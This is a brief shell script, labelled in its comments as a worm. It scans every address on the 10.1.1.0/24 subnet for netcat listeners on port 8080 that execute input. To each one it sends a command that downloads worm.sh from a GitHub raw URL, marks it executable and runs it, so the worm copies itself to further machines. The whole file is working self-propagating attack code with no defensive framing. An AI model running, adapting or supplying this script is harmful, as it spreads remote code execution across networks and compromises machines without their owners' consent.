#!/bin/sh
#
# Uses nc to find any boxes on 10.1.1.0/24 subnet that are listening on port 8080 and executing input (-e /bin/bash)
# Spreads worm to any vulnerable machines
#
wormcmd="wget -O worm.sh raw.github.com/JrM2628/Scripts/master/worm.sh; chmod +x worm.sh; ./worm.sh;"
for ip in 10.1.1.{1..254}
do
	echo $wormcmd | nc ${ip} 8080 -q 2
done
